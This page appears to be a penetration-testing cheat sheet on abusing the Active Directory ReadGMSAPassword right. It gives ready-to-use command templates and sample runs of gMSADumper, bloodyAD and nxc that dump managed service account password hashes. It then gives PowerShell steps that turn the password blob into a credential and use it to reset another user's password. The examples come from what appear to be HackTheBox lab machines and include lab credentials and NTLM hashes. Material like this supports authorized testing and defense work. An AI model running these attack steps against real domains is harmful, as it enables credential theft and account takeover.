---
title: "ReadGMSAPassword"
date: 2024-7-23
tags: ["Credential Dumping", "ReadGMSApassword", "Gmsadumper", "Active Directory", "Windows"]
---

### Abuse #1: Read GMSAPassword (From Linux)

{{< tab set1 tab1 >}}gMSADumper{{< /tab >}}
{{< tab set1 tab2 >}}BloodyAD{{< /tab >}}
{{< tab set1 tab3 >}}nxc{{< /tab >}}
{{< tabcontent set1 tab1 >}}

```console
python3 gMSADumper.py -u <USER> -p '<PASSWORD>' -l <DC> -d <DOMAIN>
```

```console {class="sample-code"}
$ python3 gMSADumper.py -u ted.graves -p Mr.Teddy -l intelligence.htb -d intelligence.htb
Users or groups who can read password for svc_int$:
 > DC$
 > itsupport
svc_int$:::745bd2c68dfc101a74f48d87027c7dc6
svc_int$:aes256-cts-hmac-sha1-96:8b2e9edb20258a45ad9084c89e7df761f3b85da5abd92849c150d4ed43f1056f
svc_int$:aes128-cts-hmac-sha1-96:798345b20bd9a8866a87b351c0ad68f3
```

<small>*Ref: [gMSADumper](https://github.com/micahvandeusen/gMSADumper)*</small>

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

```console
python3 bloodyAD.py -d <DOMAIN> -u <USER> -p '<PASSWORD>' --host <DC> get object '<TARGET_OBJECT>' --attr msDS-ManagedPassword
```

```console {class="sample-code"}
$ python3 bloodyAD.py -d intelligence.htb -u ted.graves -p 'Mr.Teddy' --host intelligence.htb get object 'svc_int$' --attr msDS-ManagedPassword 

distinguishedName: CN=svc_int,CN=Managed Service Accounts,DC=intelligence,DC=htb
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:80d4ea8c2d5ccfd1ebac5bd732ece5e4
msDS-ManagedPassword.B64ENCODED: wcVVmCKWYOZszus92zsZDFqtPFYu960EdHowLnWB5vChR4R/yj+hgVusvxgnG1OYREO70qnEiCEfP62qLZluS/UHz53T94CItJ+YxA6W5jiWTy0L03JgE1m87NCnxrzGSXHXjp4Ja1OKDde9RrIaqGN7C7cFZth05q1bOOO+x8+jdD1xRXHKgig5LDk4inLQ1xqu7Lc4vT/hIIPx2dbS0FNwGtKu2NTTVAAB/LgVwYnfMNkpti2T0cE8R12HzjGVLV/54GLU1O8iLyXdnfgAQUdnccIlSacJ3XItjjeTWuOwCKQKmc0o8BbE+rHjA5dotmBiBHsE9bw3YsCh0SNTeA==
```

<small>*Ref: [bloodyAD](https://github.com/CravateRouge/bloodyAD)*</small>

{{< /tabcontent >}}
{{< tabcontent set1 tab3 >}}

```console
nxc ldap -u <USER> -p '<PASSWORD>' -d <DOMAIN> <DC> --gmsa
```

```console {class="sample-code"}
$ nxc ldap -u ted.graves -p 'Mr.Teddy' -d intelligence.htb dc01.intelligence.htb --gmsa
SMB         10.10.10.248    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
LDAPS       10.10.10.248    636    DC               [+] intelligence.htb\ted.graves:Mr.Teddy 
LDAPS       10.10.10.248    636    DC               [*] Getting GMSA Passwords
LDAPS       10.10.10.248    636    DC               Account: svc_int$             NTLM: 80d4ea8c2d5ccfd1ebac5bd732ece5e4
```

{{< /tabcontent >}}

---

### Abuse #2: Save as Cred

{{< tab set2 tab1 >}}Windows{{< /tab >}}
{{< tabcontent set2 tab1 >}}

```console
$gmsa = Get-ADServiceAccount -Identity '<TARGET_NAME>' -Properties 'msDS-ManagedPassword'
```

```console {class="sample-code"}
PS C:\programdata> $gmsa = Get-ADServiceAccount -Identity 'BIR-ADFS-GMSA' -Properties 'msDS-ManagedPassword'
```

```console
$mp = $gmsa.'msDS-ManagedPassword'
```

```console {class="sample-code"}
PS C:\programdata> $mp = $gmsa.'msDS-ManagedPassword

PS C:\programdata> ConvertFrom-ADManagedPasswordBlob $mp

Version                   : 1
CurrentPassword           : ꪌ絸禔හॐ๠뒟娯㔃ᴨ蝓㣹瑹䢓疒웠ᇷꀠ믱츎孻勒壉馮ၸ뛋귊餮꤯ꏗ춰䃳ꘑ畓릝樗껇쁵藫䲈酜⏬궩Œ痧蘸朘嶑侪糼亵韬⓼ↂᡳ춲⼦싸ᖥ裹沑扚羺歖㗻෪ꂓ㚬⮗㞗ꆱ긿쾏㢿쭗캵십ㇾ롤
                            ᒛ�䬁ማ譿녓鏶骲雰騆惿閴滭䶙竜迉竾ﵸ䲗蔍瞬䦕垞뉧⩱茾蒚⟒澽座걍盡篇
SecureCurrentPassword     : System.Security.SecureString
PreviousPassword          : 
SecurePreviousPassword    : 
QueryPasswordInterval     : 2019.19:45:41.4967000
UnchangedPasswordInterval : 2019.19:40:41.4967000
```

```console
$password = (ConvertFrom-ADManagedPasswordBlob $mp).CurrentPassword
```

```console {class="sample-code"}
PS C:\programdata> $password = (ConvertFrom-ADManagedPasswordBlob $mp).CurrentPassword
```

```console
$SecPass = (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword
```

```console {class="sample-code"}
PS C:\programdata> $SecPass = (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword
```

```console
$cred = New-Object System.Management.Automation.PSCredential '<TARGET_NAME>', $SecPass
```

```console {class="sample-code"}
PS C:\programdata> $cred = New-Object System.Management.Automation.PSCredential 'BIR-ADFS-GMSA', $SecPass
```

```console
# For example, change password of another target user
Invoke-Command -ComputerName <COMPUTER_NAME> -ScriptBlock {Set-ADAccountPassword -Identity '<ANOTHER_TARGET_NAME>' -reset -NewPassword (ConvertTo-SecureString -AsPlainText '<NEW_PASSWORD>' -force)} -Credential $cred
```

```console {class="sample-code"}
PS C:\programdata> Invoke-Command -ComputerName . -ScriptBlock {Set-ADAccountPassword -Identity 'tristan.davies' -reset -NewPassword (ConvertTo-SecureString -AsPlainText 'Test1234' -force)} -Credential $cred
```

{{< /tabcontent >}}
